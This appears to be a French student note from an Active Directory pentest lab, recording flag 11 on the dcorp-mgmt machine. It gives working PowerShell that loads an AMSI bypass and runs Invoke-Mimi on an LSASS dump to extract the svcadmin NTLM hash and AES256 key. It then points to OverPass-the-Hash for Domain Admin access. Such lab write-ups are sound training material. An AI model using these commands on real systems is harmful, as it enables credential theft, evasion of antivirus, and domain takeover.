---
flag: 11
machine: dcorp-mgmt
statut: validé
---
# F11 · NTLM de svcadmin

> [!question] LO7 — dcorp-mgmt
> NTLM hash of svcadmin account

## Commande qui marche
Dump LSASS de dcorp-mgmt (`comsvcs.dll` natif) → parse **en mémoire** (mimikatz.exe bloqué par le Defender local student) :
```powershell
iex (Get-Content C:\AD\Tools\amsibypass.txt -Raw)
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass.dmp" "sekurlsa::ekeys"'
```
→ bloc **svcadmin** : NTLM (`rc4_hmac`) + clé `aes256_hmac`. Dump + exfil détaillés : [[LO07 - Session DA et escalade]].

> [!tip] La clé `aes256` récupérée ici alimente directement l'**OverPass-the-Hash** → TGT Domain Admin (cf [[LO07 - Session DA et escalade]] étape 8).

## Fiches liées
[[Cheatsheet - Post-exploitation]] · [[LO07 - Session DA et escalade]]

[[Flags - Index]] · [[Journal - Index]]
